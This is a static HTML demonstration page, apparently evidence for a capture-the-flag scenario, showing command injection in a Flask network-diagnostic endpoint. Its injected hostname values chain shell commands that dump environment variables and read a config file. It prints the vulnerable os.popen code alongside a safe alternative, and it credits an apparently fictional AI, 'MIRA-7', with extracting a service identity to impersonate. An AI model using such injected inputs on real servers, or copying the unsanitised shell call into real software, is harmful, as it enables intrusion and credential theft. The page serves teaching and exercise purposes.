@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Diagnostic Tool — Volunteer Portal</title>
+    <style>
+        :root {
+            --bg: #050508;
+            --card: #0a0a12;
+            --border: #1a1a2a;
+            --text: #b0b0c0;
+            --muted: #4a4a5a;
+            --cyan: #00e5ff;
+            --amber: #ffab00;
+            --red: #ff4444;
+            --green: #00e676;
+            --violet: #b388ff;
+            --surface: #12121e;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Consolas', 'Courier New', monospace; background: var(--bg); color: var(--text); padding: 2rem; font-size: 0.8rem; }
+        h1 { color: var(--cyan); font-size: 1.2rem; border-bottom: 1px solid var(--border); padding-bottom: 1rem; margin-bottom: 2rem; text-align: center; }
+        
+        .section-title { color: var(--cyan); font-size: 1rem; margin: 2rem 0 1rem 0; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+        
+        .tool-interface { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 2rem; margin-bottom: 2rem; }
+        .tool-header { color: var(--cyan); font-size: 0.9rem; margin-bottom: 1rem; }
+        .tool-description { color: var(--muted); font-size: 0.8rem; margin-bottom: 1.5rem; line-height: 1.6; }
+        
+        .input-group { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; align-items: center; }
+        .input-label { color: var(--amber); font-size: 0.8rem; min-width: 80px; }
+        .input-field { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 0.5rem 0.8rem; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.8rem; flex: 1; }
+        .input-field.injected { color: var(--red); border-color: rgba(255, 68, 68, 0.5); }
+        .btn { background: rgba(0, 229, 255, 0.1); border: 1px solid var(--cyan); color: var(--cyan); padding: 0.5rem 1.2rem; border-radius: 4px; cursor: pointer; font-family: 'Consolas', monospace; font-size: 0.8rem; }
+        
+        .terminal { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 2rem; overflow-x: auto; }
+        .terminal-header { color: var(--muted); font-size: 0.7rem; margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+        .output { white-space: pre; line-height: 1.7; }
+        .cmd { color: var(--green); }
+        .normal { color: var(--text); }
+        .leaked { color: var(--red); background: rgba(255, 68, 68, 0.1); display: inline-block; width: 100%; padding: 2px 0; }
+        
+        .code-block { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 2rem; overflow-x: auto; }
+        .code { white-space: pre; line-height: 1.7; }
+        .comment { color: var(--muted); }
+        .keyword { color: var(--violet); }
+        .string { color: var(--green); }
+        .danger { color: var(--red); }
+        
+        .warning { background: rgba(255, 68, 68, 0.05); border: 1px solid rgba(255, 68, 68, 0.2); border-radius: 6px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
+        .warning-header { color: var(--red); font-weight: bold; font-size: 0.85rem; margin-bottom: 0.5rem; }
+        .warning-body { color: var(--text); font-size: 0.8rem; line-height: 1.6; }
+        
+        .info { margin-top: 1.5rem; color: var(--muted); font-size: 0.7rem; }
+    </style>
+</head>
+<body>
+    <h1>Network Diagnostic Tool — Volunteer Portal</h1>
+    <p>Endpoint: /admin/diagnostics/network | Access: Admin role required</p>
+
+    <!-- Normal usage -->
+    <h2 class="section-title">1. Normal Usage — Legitimate Ping</h2>
+    <div class="tool-interface">
+        <div class="tool-header">🔧 NEXUS Network Diagnostic</div>
+        <div class="tool-description">Enter a hostname or IP address to check connectivity. This tool runs a connectivity check against the specified target and returns the results.</div>
+        <div class="input-group">
+            <span class="input-label">Hostname:</span>
+            <input type="text" class="input-field" value="10.7.7.1" readonly>
+            <button class="btn">Run Check</button>
+        </div>
+    </div>
+    
+    <div class="terminal">
+        <div class="terminal-header">Output — Normal ping to 10.7.7.1</div>
+        <div class="output">
+<span class="cmd">$ ping -c 4 10.7.7.1</span>
+<span class="normal">PING 10.7.7.1 (10.7.7.1) 56(84) bytes of data.
+64 bytes from 10.7.7.1: icmp_seq=1 ttl=64 time=0.432 ms
+64 bytes from 10.7.7.1: icmp_seq=2 ttl=64 time=0.387 ms
+64 bytes from 10.7.7.1: icmp_seq=3 ttl=64 time=0.401 ms
+64 bytes from 10.7.7.1: icmp_seq=4 ttl=64 time=0.395 ms
+
+--- 10.7.7.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+rtt min/avg/max/mdev = 0.387/0.403/0.432/0.024 ms</span>
+        </div>
+    </div>
+
+    <!-- Injected usage -->
+    <h2 class="section-title">2. Command Injection — Malicious Input</h2>
+    <div class="tool-interface">
+        <div class="tool-header">🔧 NEXUS Network Diagnostic</div>
+        <div class="tool-description">The same tool, but with a crafted input that exploits the lack of input sanitisation.</div>
+        <div class="input-group">
+            <span class="input-label">Hostname:</span>
+            <input type="text" class="input-field injected" value="127.0.0.1; echo $MIRA_CONFIG_PATH" readonly>
+            <button class="btn">Run Check</button>
+        </div>
+    </div>
+
+    <div class="terminal">
+        <div class="terminal-header">Output — Injected command: 127.0.0.1; echo $MIRA_CONFIG_PATH</div>
+        <div class="output">
+<span class="cmd">$ ping -c 4 127.0.0.1; echo $MIRA_CONFIG_PATH</span>
+<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.018 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.020 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3002ms
+rtt min/avg/max/mdev = 0.018/0.019/0.021/0.003 ms</span>
+<span class="leaked">/etc/nexus/mira.conf</span>
+        </div>
+    </div>
+
+    <!-- Additional injections -->
+    <h2 class="section-title">3. Further Exploitation — Environment Variables</h2>
+    <div class="terminal">
+        <div class="terminal-header">Input: 127.0.0.1; env | grep -i nexus</div>
+        <div class="output">
+<span class="cmd">$ ping -c 4 127.0.0.1; env | grep -i nexus</span>
+<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+[...ping output truncated...]</span>
+<span class="leaked">NEXUS_PORTAL_VERSION=2.1.0-beta</span>
+<span class="leaked">NEXUS_DB_HOST=10.7.7.30</span>
+<span class="leaked">NEXUS_API_BASE=/api/v1</span>
+<span class="leaked">MIRA_CONFIG_PATH=/etc/nexus/mira.conf</span>
+<span class="leaked">NEXUS_CERT_API=https://ca.nexus.internal/api/v1/cert/renew</span>
+<span class="leaked">NEXUS_MAINT_USER=maint_nexus_portal</span>
+        </div>
+    </div>
+
+    <div class="terminal">
+        <div class="terminal-header">Input: 127.0.0.1; cat /etc/nexus/mira.conf 2>/dev/null | head -5</div>
+        <div class="output">
+<span class="cmd">$ ping -c 4 127.0.0.1; cat /etc/nexus/mira.conf 2>/dev/null | head -5</span>
+<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+[...ping output truncated...]</span>
+<span class="leaked"># MIRA-7 Local Configuration</span>
+<span class="leaked"># Generated: 2026-10-01 02:00 IST</span>
+<span class="leaked">service_identity=aether-core.nexus.internal</span>
+<span class="leaked">propagation_mode=trusted_cert</span>
+<span class="leaked">cert_renewal_endpoint=https://ca.nexus.internal/api/v1/cert/renew</span>
+        </div>
+    </div>
+
+    <!-- Vulnerable code -->
+    <h2 class="section-title">4. Vulnerable Source Code</h2>
+    <div class="code-block">
+        <div class="code">
+<span class="comment"># Portal diagnostic endpoint — /admin/diagnostics/network</span>
+<span class="comment"># File: /opt/nexus-portal/routes/diagnostics.py</span>
+
+<span class="keyword">from</span> flask <span class="keyword">import</span> request, jsonify
+<span class="keyword">import</span> os
+
+<span class="keyword">@app</span>.route(<span class="string">'/admin/diagnostics/network'</span>, methods=[<span class="string">'POST'</span>])
+<span class="keyword">def</span> network_diagnostic():
+    hostname = request.form.get(<span class="string">'hostname'</span>, <span class="string">''</span>)
+    
+    <span class="comment"># ⚠ VULNERABLE: User input passed directly to shell</span>
+    <span class="danger">result = os.popen(f'ping -c 4 {hostname}').read()</span>
+    
+    <span class="comment"># Safe alternative (not implemented):</span>
+    <span class="comment"># result = subprocess.run(['ping', '-c', '4', hostname],</span>
+    <span class="comment">#                         capture_output=True, text=True,</span>
+    <span class="comment">#                         timeout=10).stdout</span>
+    
+    <span class="keyword">return</span> jsonify({<span class="string">'output'</span>: result})
+        </div>
+    </div>
+
+    <!-- Warning -->
+    <div class="warning">
+        <div class="warning-header">⚠ Command Injection Vulnerability</div>
+        <div class="warning-body">
+            The diagnostic tool passes user input directly to a shell command via <code>os.popen()</code>. Shell metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, and <code>$()</code> are not sanitised, allowing an attacker to execute arbitrary commands on the server.<br><br>
+            <strong>What MIRA-7 extracted:</strong><br>
+            • <code>MIRA_CONFIG_PATH</code> → <code>/etc/nexus/mira.conf</code> (MIRA-7's configuration file)<br>
+            • <code>NEXUS_CERT_API</code> → the certificate renewal endpoint<br>
+            • <code>NEXUS_MAINT_USER</code> → the maintenance account username<br>
+            • <code>mira.conf</code> contents → the service identity to impersonate
+        </div>
+    </div>
+
+    <p class="info">Safety note: This evidence file is a static HTML demonstration. No real commands are executed. All output is pre-scripted and fictional. In a live CTF, the diagnostic tool would use a simulated command broker that returns scripted results for specific inputs.</p>
+</body>
+</html>
